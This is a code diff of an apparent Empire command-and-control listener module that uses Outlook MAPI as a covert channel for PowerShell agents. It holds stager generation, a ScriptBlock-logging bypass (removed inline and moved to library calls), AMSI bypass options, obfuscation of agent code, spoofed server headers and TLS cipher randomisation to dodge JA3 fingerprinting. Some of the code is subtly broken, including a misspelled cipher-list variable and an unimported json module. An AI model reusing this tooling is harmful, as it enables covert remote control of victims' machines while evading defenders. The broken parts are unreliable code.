@@ -1,3 +1,6 @@
+from __future__ import print_function
+from builtins import str
+from builtins import object
 import logging
 import base64
 import random
@@ -6,6 +9,7 @@ import ssl
 import time
 import copy
 import sys
+import threading
 from pydispatch import dispatcher
 from flask import Flask, request, make_response
 
@@ -17,7 +21,7 @@ from lib.common import packets
 from lib.common import messages
 
 
-class Listener:
+class Listener(object):
 
     def __init__(self, mainMenu, params=[]):
 
@@ -46,7 +50,7 @@ class Listener:
             'Host' : {
                 'Description'   :   'Hostname/IP for staging.',
                 'Required'      :   True,
-                'Value'         :   "http://%s:%s" % (helpers.lhost(), 80)
+                'Value'         :   "http://%s" % (helpers.lhost())
             },
             'BindIP' : {
                 'Description'   :   'The IP to bind to on the control server.',
@@ -56,7 +60,7 @@ class Listener:
             'Port' : {
                 'Description'   :   'Port for the listener.',
                 'Required'      :   True,
-                'Value'         :   80
+                'Value'         :   ''
             },
             'StagingKey' : {
                 'Description'   :   'Staging key for initial agent negotiation.',
@@ -98,10 +102,10 @@ class Listener:
                 'Required'      :   False,
                 'Value'         :   ''
             },
-            'ServerVersion' : {
-                'Description'   :   'TServer header for the control server.',
+            'Headers' : {
+                'Description'   :   'Headers for the control server.',
                 'Required'      :   True,
-                'Value'         :   'Microsoft-IIS/7.5'
+                'Value'         :   'Server:Microsoft-IIS/7.5'
             },
             'Folder' : {
                 'Description'   :   'The hidden folder in Exchange to user',
@@ -157,19 +161,23 @@ class Listener:
 
         for key in self.options:
             if self.options[key]['Required'] and (str(self.options[key]['Value']).strip() == ''):
-                print helpers.color("[!] Option \"%s\" is required." % (key))
+                print(helpers.color("[!] Option \"%s\" is required." % (key)))
                 return False
+        # If we've selected an HTTPS listener without specifying CertPath, let us know.
+        if self.options['Host']['Value'].startswith('https') and self.options['CertPath']['Value'] == '':
+            print(helpers.color("[!] HTTPS selected but no CertPath specified."))
+            return False
 
         return True
 
 
-    def generate_launcher(self, encode=True, obfuscate=False, obfuscationCommand="", userAgent='default', proxy='default', proxyCreds='default', stagerRetries='0', language=None, safeChecks='', listenerName=None):
+    def generate_launcher(self, encode=True, obfuscate=False, obfuscationCommand="", userAgent='default', proxy='default', proxyCreds='default', stagerRetries='0', language=None, safeChecks='', listenerName=None, scriptLogBypass=True, AMSIBypass=True, AMSIBypass2=False):
         """
         Generate a basic launcher for the specified listener.
         """
 
         if not language:
-            print helpers.color('[!] listeners/http generate_launcher(): no language specified!')
+            print(helpers.color('[!] listeners/http generate_launcher(): no language specified!'))
 
         if listenerName and (listenerName in self.threads) and (listenerName in self.mainMenu.listeners.activeListeners):
 
@@ -187,40 +195,26 @@ class Listener:
                 stager = '$ErrorActionPreference = \"SilentlyContinue\";'
                 if safeChecks.lower() == 'true':
                     stager = helpers.randomize_capitalization("If($PSVersionTable.PSVersion.Major -ge 3){")
-
                     # ScriptBlock Logging bypass
-                    stager += helpers.randomize_capitalization("$GPF=[ref].Assembly.GetType(")
-                    stager += "'System.Management.Automation.Utils'"
-                    stager += helpers.randomize_capitalization(").\"GetFie`ld\"(")
-                    stager += "'cachedGroupPolicySettings','N'+'onPublic,Static'"
-                    stager += helpers.randomize_capitalization(");If($GPF){$GPC=$GPF.GetValue($null);If($GPC")
-                    stager += "['ScriptB'+'lockLogging']"
-                    stager += helpers.randomize_capitalization("){$GPC")
-                    stager += "['ScriptB'+'lockLogging']['EnableScriptB'+'lockLogging']=0;"
-                    stager += helpers.randomize_capitalization("$GPC")
-                    stager += "['ScriptB'+'lockLogging']['EnableScriptBlockInvocationLogging']=0}"
-                    stager += helpers.randomize_capitalization("$val=[Collections.Generic.Dictionary[string,System.Object]]::new();$val.Add")
-                    stager += "('EnableScriptB'+'lockLogging',0);"
-                    stager += helpers.randomize_capitalization("$val.Add")
-                    stager += "('EnableScriptBlockInvocationLogging',0);"
-                    stager += helpers.randomize_capitalization("$GPC")
-                    stager += "['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptB'+'lockLogging']"
-                    stager += helpers.randomize_capitalization("=$val}")
-                    stager += helpers.randomize_capitalization("Else{[ScriptBlock].\"GetFie`ld\"(")
-                    stager += "'signatures','N'+'onPublic,Static'"
-                    stager += helpers.randomize_capitalization(").SetValue($null,(New-Object Collections.Generic.HashSet[string]))}")
-
+                    if scriptLogBypass:
+                        stager += bypasses.scriptBlockLogBypass()
                     # @mattifestation's AMSI bypass
+                    if AMSIBypass:
+                        stager += bypasses.AMSIBypass()
+                    # rastamouse AMSI bypass
+                    if AMSIBypass2:
+                        stager += bypasses.AMSIBypass2()
+                    stager += "};"
                     stager += helpers.randomize_capitalization('Add-Type -assembly "Microsoft.Office.Interop.Outlook";')
-                    stager += "$outlook = New-Object -comobject Outlook.Application;"
-                    stager += helpers.randomize_capitalization('$mapi = $Outlook.GetNameSpace("')
+                    stager += "$"+helpers.generate_random_script_var_name("GPF")+" = New-Object -comobject Outlook.Application;"
+                    stager += helpers.randomize_capitalization('$mapi = $'+helpers.generate_random_script_var_name("GPF")+'.GetNameSpace("')
                     stager += 'MAPI");'
                     if listenerOptions['Email']['Value'] != '':
-                        stager += '$fld = $outlook.Session.Folders | Where-Object {$_.Name -eq "'+listenerOptions['Email']['Value']+'"} | %{$_.Folders.Item(2).Folders.Item("'+listenerOptions['Folder']['Value']+'")};'
-                        stager += '$fldel = $outlook.Session.Folders | Where-Object {$_.Name -eq "'+listenerOptions['Email']['Value']+'"} | %{$_.Folders.Item(3)};'
+                        stager += '$fld = $'+helpers.generate_random_script_var_name("GPF")+'.Session.Folders | Where-Object {$_.Name -eq "'+listenerOptions['Email']['Value']+'"} | %{$_.Folders.Item(2).Folders.Item("'+listenerOptions['Folder']['Value']+'")};'
+                        stager += '$fldel = $'+helpers.generate_random_script_var_name("GPF")+'.Session.Folders | Where-Object {$_.Name -eq "'+listenerOptions['Email']['Value']+'"} | %{$_.Folders.Item(3)};'
                     else:
-                        stager += '$fld = $outlook.Session.GetDefaultFolder(6).Folders.Item("'+listenerOptions['Folder']['Value']+'");'
-                        stager += '$fldel = $outlook.Session.GetDefaultFolder(3);'
+                        stager += '$fld = $'+helpers.generate_random_script_var_name("GPF")+'.Session.GetDefaultFolder(6).Folders.Item("'+listenerOptions['Folder']['Value']+'");'
+                        stager += '$fldel = $'+helpers.generate_random_script_var_name("GPF")+'.Session.GetDefaultFolder(3);'
                 # clear out all existing mails/messages
 
                 stager += helpers.randomize_capitalization("while(($fld.Items | measure | %{$_.Count}) -gt 0 ){ $fld.Items | %{$_.delete()};}")
@@ -236,7 +230,7 @@ class Listener:
                 b64RoutingPacket = base64.b64encode(routingPacket)
 
                 # add the RC4 packet to a cookie
-                stager += helpers.randomize_capitalization('$mail = $outlook.CreateItem(0);$mail.Subject = "')
+                stager += helpers.randomize_capitalization('$mail = $'+helpers.generate_random_script_var_name("GPF")+'.CreateItem(0);$mail.Subject = "')
                 stager += 'mailpireout";'
                 stager += helpers.randomize_capitalization('$mail.Body = ')
                 stager += '"STAGE - %s"' % b64RoutingPacket
@@ -261,10 +255,10 @@ class Listener:
                     # otherwise return the case-randomized stager
                     return stager
             else:
-                print helpers.color("[!] listeners/http_mapi generate_launcher(): invalid language specification: only 'powershell' is currently supported for this module.")
+                print(helpers.color("[!] listeners/http_mapi generate_launcher(): invalid language specification: only 'powershell' is currently supported for this module."))
 
         else:
-            print helpers.color("[!] listeners/http_mapi generate_launcher(): invalid listener name specification!")
+            print(helpers.color("[!] listeners/http_mapi generate_launcher(): invalid listener name specification!"))
 
 
     def generate_stager(self, listenerOptions, encode=False, encrypt=True, language="powershell"):
@@ -289,6 +283,12 @@ class Listener:
             f = open("%s/data/agent/stagers/http_mapi.ps1" % (self.mainMenu.installPath))
             stager = f.read()
             f.close()
+
+            # Get the random function name generated at install and patch the stager with the proper function name
+            conn = self.get_db_connection()
+            self.lock.acquire()
+            stager = helpers.keyword_obfuscation(stager)
+            self.lock.release()
 
             # make sure the server ends with "/"
             if not host.endswith("/"):
@@ -324,7 +324,7 @@ class Listener:
                 # otherwise just return the case-randomized stager
                 return randomizedStager
         else:
-            print helpers.color("[!] listeners/http generate_stager(): invalid language specification, only 'powershell' is currently supported for this module.")
+            print(helpers.color("[!] listeners/http generate_stager(): invalid language specification, only 'powershell' is currently supported for this module."))
 
 
     def generate_agent(self, listenerOptions, language=None):
@@ -333,7 +333,7 @@ class Listener:
         """
 
         if not language:
-            print helpers.color('[!] listeners/http_mapi generate_agent(): no language specified!')
+            print(helpers.color('[!] listeners/http_mapi generate_agent(): no language specified!'))
             return None
 
         language = language.lower()
@@ -351,6 +351,12 @@ class Listener:
             f = open(self.mainMenu.installPath + "./data/agent/agent.ps1")
             code = f.read()
             f.close()
+
+            # Get the random function name generated at install and patch the stager with the proper function name
+            conn = self.get_db_connection()
+            self.lock.acquire()
+            code = helpers.keyword_obfuscation(code)
+            self.lock.release()
 
             # patch in the comms methods
             commsCode = self.generate_comms(listenerOptions=listenerOptions, language=language)
@@ -373,7 +379,7 @@ class Listener:
 
             return code
         else:
-            print helpers.color("[!] listeners/http_mapi generate_agent(): invalid language specification, only 'powershell' is currently supported for this module.")
+            print(helpers.color("[!] listeners/http_mapi generate_agent(): invalid language specification, only 'powershell' is currently supported for this module."))
 
 
     def generate_comms(self, listenerOptions, language=None):
@@ -401,7 +407,7 @@ class Listener:
                                 # choose a random valid URI for checkin
                                 $taskURI = $script:TaskURIs | Get-Random;
 
-                                $mail = $outlook.CreateItem(0);
+                                $mail = $"""+helpers.generate_random_script_var_name("GPF")+""".CreateItem(0);
                                 $mail.Subject = "mailpireout";
                                 $mail.Body = "GET - "+$RoutingCookie+" - "+$taskURI;
                                 $mail.save() | out-null;
@@ -431,7 +437,7 @@ class Listener:
                         catch {
 
                         }
-                        while(($fldel.Items | measure | %{$_.Count}) -gt 0 ){ $fldel.Items | %{$_.delete()};} 
+                        while(($fldel.Items | measure | %{$_.Count}) -gt 0 ){ $fldel.Items | %{$_.delete()};}
                     }
                 """
 
@@ -451,7 +457,7 @@ class Listener:
                             try {
                                     # get a random posting URI
                                     $taskURI = $Script:TaskURIs | Get-Random;
-                                    $mail = $outlook.CreateItem(0);
+                                    $mail = $"""+helpers.generate_random_script_var_name("GPF")+""".CreateItem(0);
                                     $mail.Subject = "mailpireout";
                                     $mail.Body = "POSTM - "+$taskURI +" - "+$RoutingPacketp;
                                     $mail.save() | out-null;
@@ -459,16 +465,16 @@ class Listener:
                                 }
                                 catch {
                                 }
-                                while(($fldel.Items | measure | %{$_.Count}) -gt 0 ){ $fldel.Items | %{$_.delete()};} 
+                                while(($fldel.Items | measure | %{$_.Count}) -gt 0 ){ $fldel.Items | %{$_.delete()};}
                         }
                     }
                 """
                 return updateServers + getTask + sendMessage
 
             else:
-                print helpers.color("[!] listeners/http_mapi generate_comms(): invalid language specification, only 'powershell' is currently supported for this module.")
+                print(helpers.color("[!] listeners/http_mapi generate_comms(): invalid language specification, only 'powershell' is currently supported for this module."))
         else:
-            print helpers.color('[!] listeners/http_mapi generate_comms(): no language specified!')
+            print(helpers.color('[!] listeners/http_mapi generate_comms(): no language specified!'))
 
 
     def start_server(self, listenerOptions):
@@ -503,8 +509,11 @@ class Listener:
 
         @app.after_request
         def change_header(response):
-            "Modify the default server version in the response."
-            response.headers['Server'] = listenerOptions['ServerVersion']['Value']
+            "Modify the headers response server."
+            headers = listenerOptions['Headers']['Value']
+            for key in headers.split("|"):
+               value = key.split(":")
+               response.headers[value[0]] = value[1]
             return response
 
 
@@ -518,7 +527,13 @@ class Listener:
             """
 
             clientIP = request.remote_addr
-            dispatcher.send("[*] GET request for %s/%s from %s" % (request.host, request_uri, clientIP), sender='listeners/http')
+            listenerName = self.options['Name']['Value']
+            message = "[*] GET request for {}/{} from {}".format(request.host, request_uri, clientIP)
+            signal = json.dumps({
+                'print': False,
+                'message': message
+            })
+            dispatcher.send(signal, sender="listeners/http_com/{}".format(listenerName))
             routingPacket = None
             cookie = request.headers.get('Cookie')
             if cookie and cookie != '':
@@ -546,7 +561,7 @@ class Listener:
                                 # handle_agent_data() signals that the listener should return the stager.ps1 code
 
                                 # step 2 of negotiation -> return stager.ps1 (stage 1)
-                                dispatcher.send("[*] Sending %s stager (stage 1) to %s" % (language, clientIP), sender='listeners/http')
+                                dispatcher.send("\n[*] Sending %s stager (stage 1) to %s" % (language, clientIP), sender='listeners/http')
                                 stage = self.generate_stager(language=language, listenerOptions=listenerOptions)
                                 return make_response(stage, 200)
 
@@ -555,7 +570,7 @@ class Listener:
 
                                 if 'not in cache' in results:
                                     # signal the client to restage
-                                    print helpers.color("[*] Orphaned agent from %s, signaling retaging" % (clientIP))
+                                    print(helpers.color("[*] Orphaned agent from %s, signaling retaging" % (clientIP)))
                                     return make_response(self.default_response(), 401)
                                 else:
                                     return make_response(self.default_response(), 200)
@@ -635,12 +650,18 @@ class Listener:
 
                 context = ssl.SSLContext(proto)
                 context.load_cert_chain("%s/empire-chain.pem" % (certPath), "%s/empire-priv.key"  % (certPath))
+                # setting the cipher list allows for modification of the JA3 signature. Select a random cipher to change
+                # it every time the listener is launched
+                ipherlist = ["ECDHE-RSA-AES256-GCM-SHA384", "ECDHE-RSA-AES128-GCM-SHA256", "ECDHE-RSA-AES256-SHA384",
+                             "ECDHE-RSA-AES256-SHA", "AES256-SHA256", "AES128-SHA256"]
+                selectciph = random.choice(cipherlist)
+                context.set_ciphers(selectciph)
                 app.run(host=bindIP, port=int(port), threaded=True, ssl_context=context)
             else:
                 app.run(host=bindIP, port=int(port), threaded=True)
 
         except Exception as e:
-            print helpers.color("[!] Listener startup on port %s failed: %s " % (port, e))
+            print(helpers.color("[!] Listener startup on port %s failed: %s " % (port, e)))
             dispatcher.send("[!] Listener startup on port %s failed: %s " % (port, e), sender='listeners/http')
 
 
@@ -672,8 +693,8 @@ class Listener:
         """
 
         if name and name != '':
-            print helpers.color("[!] Killing listener '%s'" % (name))
+            print(helpers.color("[!] Killing listener '%s'" % (name)))
             self.threads[name].kill()
         else:
-            print helpers.color("[!] Killing listener '%s'" % (self.options['Name']['Value']))
+            print(helpers.color("[!] Killing listener '%s'" % (self.options['Name']['Value'])))
             self.threads[self.options['Name']['Value']].kill()
